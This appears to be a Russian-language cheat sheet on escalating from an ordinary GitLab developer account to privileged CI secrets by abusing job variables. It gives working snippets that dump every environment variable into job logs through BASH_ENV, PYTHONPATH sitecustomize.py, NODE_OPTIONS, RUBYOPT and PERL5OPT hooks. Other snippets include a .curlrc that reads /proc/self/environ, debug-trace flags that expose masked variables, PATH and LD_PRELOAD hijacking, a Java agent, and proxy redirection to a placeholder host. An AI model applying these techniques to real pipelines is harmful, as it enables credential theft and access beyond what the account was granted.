Вопрос
Ответ

Бывает, что с обычной учёткой разработчика в GitLab можно найти привилегированные учётки в стейджах

CI_DEBUG_TRACE

В GitLab CI CI_DEBUG_TRACE управляет подробным trace-логом выполнения job

variables:
  CI_DEBUG_TRACE: "true"

В trace будут видны выполняемые команды и их аргументы. GitLab маскирует защищённые переменные, но секрет всё равно может попасть в вывод программы или оказаться в форме, которую маскирование не распознает

CURL_HOME

  1. В корне проекта создаётся .curlrc:
verbose
show-error

url = "file:///proc/self/environ"
output = "/dev/stderr"

next
  1. Задаём переменную CURL_HOME="$CI_PROJECT_DIR"

При запуске curl прочитает .curlrc, запросит указанный url и выведет результат в stderr job

BASH_ENV

  1. В корне проекта создаётся env.sh:
{
  echo "=== BASH_ENV_HIT ==="
  id
  pwd
  echo "=== ENV ==="
  env | sort
  echo "=== END ==="
} >&2
  1. Задаём переменную BASH_ENV: "$CI_PROJECT_DIR/env.sh"

При каждом неинтерактивном запуске Bash прочитает env.sh до выполнения основного скрипта. На другие shell эта переменная не действует

PYTHONPATH

  1. В корне проекта создаётся pythonpath/sitecustomize.py:
import os
import sys

print("=== PYTHONPATH_ENV ===", file=sys.stderr)
for name, value in sorted(os.environ.items()):
    print(f"{name}={value}", file=sys.stderr)
  1. Задаём переменную PYTHONPATH: "$CI_PROJECT_DIR/pythonpath"

При обычном запуске Python модуль site автоматически импортирует найденный sitecustomize.py

Флаги -S, -I и некоторые изолированные окружения отключают или ограничивают этот механизм

PATH

  1. В проекте создаётся каталог со своими исполняемыми файлами, например .ci/bin

  2. Каталог ставится первым в PATH:

variables:
  PATH: "$CI_PROJECT_DIR/.ci/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

Если job вызывает команду без абсолютного пути, shell возьмёт первый одноимённый исполняемый файл из PATH. Встроенные команды shell и вызовы вроде /usr/bin/curl так не переопределяются

LD_*

  • LD_PRELOAD — загружает указанную динамическую библиотеку раньше остальных
  • LD_LIBRARY_PATH — добавляет каталоги в путь поиска динамических библиотек
  • LD_AUDIT — подключает audit-библиотеку для наблюдения за работой динамического линковщика в glibc

Не работают со статически собранными программами

PYTHONHOME

Переменная PYTHONHOME задаёт базовый каталог, в котором Python ищет стандартную библиотеку и платформенные модули

variables:
  PYTHONHOME: "$CI_PROJECT_DIR/pythonhome"

В отличие от PYTHONPATH, эта переменная ничего не запускает автоматически. Если в каталоге нет подходящей стандартной библиотеки, Python обычно завершится с ошибкой вроде No module named 'encodings'. Для подключения своих модулей и sitecustomize.py нужен PYTHONPATH

HOME

Переменную HOME можно направить в каталог проекта:

variables:
  HOME: "$CI_PROJECT_DIR"

После этого многие инструменты начнут искать пользовательские конфиги в проекте: curl — .curlrc, Git — .gitconfig, а другие — файлы в $HOME или $HOME/.config

CI_DEBUG_SERVICES

Переменная CI_DEBUG_SERVICES добавляет в trace логи service-контейнеров:

variables:
  CI_DEBUG_SERVICES: "true"

Полезно для отладки PostgreSQL, Redis, Docker-in-Docker итд. Логи сервисов смешиваются с логом job, а masked-переменные могут оказаться раскрыты

NODE_OPTIONS

  1. В проекте создаётся .ci/node-hook.cjs:
console.error("=== NODE_OPTIONS_HIT ===")
console.error("=== NODE_OPTIONS_ENV ===")
console.error(Object.entries(process.env)
  .sort(([left], [right]) => left.localeCompare(right))
  .map(([name, value]) => `${name}=${value}`)
  .join("\n"))
  1. Модуль подключается через NODE_OPTIONS:
variables:
  NODE_OPTIONS: "--require=$CI_PROJECT_DIR/.ci/node-hook.cjs"

При каждом запуске Node.js модуль будет загружен до основного приложения. Для CommonJS используется --require, для ESM — --import

RUBYOPT

  1. В проекте создаётся .ci/ruby/ci_hook.rb:
warn "=== RUBYOPT_HIT ==="
warn "=== RUBYOPT_ENV ==="
ENV.sort.each { |name, value| warn "#{name}=#{value}" }
  1. Задаётся путь поиска и автоматическое подключение библиотеки:
variables:
  RUBYLIB: "$CI_PROJECT_DIR/.ci/ruby"
  RUBYOPT: "-rci_hook"

При каждом запуске Ruby параметр -r подключит ci_hook.rb до основного скрипта

PERL5OPT

  1. В проекте создаётся .ci/perl/CiHook.pm:
package CiHook;
warn "=== PERL5OPT_HIT ===\n";
warn "=== PERL5OPT_ENV ===\n";
warn "$_=$ENV{$_}\n" for sort keys %ENV;
1;
  1. Задаётся каталог модулей и параметр их загрузки:
variables:
  PERL5LIB: "$CI_PROJECT_DIR/.ci/perl"
  PERL5OPT: "-MCiHook"

При каждом запуске Perl модуль CiHook будет загружен до основного скрипта

JAVA_TOOL_OPTIONS

JAVA_TOOL_OPTIONS добавляет параметры при создании JVM:

variables:
  JAVA_TOOL_OPTIONS: "-javaagent:$CI_PROJECT_DIR/.ci/audit-agent.jar"

При запуске Java будет подключён указанный Java agent. Похожая переменная JDK_JAVA_OPTIONS передаёт параметры Java launcher

XDG_CONFIG_HOME

Переменная XDG_CONFIG_HOME — общий путь к пользовательским конфигам для инструментов, которые поддерживают XDG Base Directory:

variables:
  XDG_CONFIG_HOME: "$CI_PROJECT_DIR/.config"

После этого поиск конфигов будет в подкаталогах .config

PROXY

Proxy-переменные меняют маршрут сетевых запросов:

variables:
  HTTPS_PROXY: "http://proxy.example:8080"
  HTTP_PROXY: "http://proxy.example:8080"
  ALL_PROXY: "socks5://proxy.example:1080"
  NO_PROXY: "localhost,127.0.0.1,.internal"
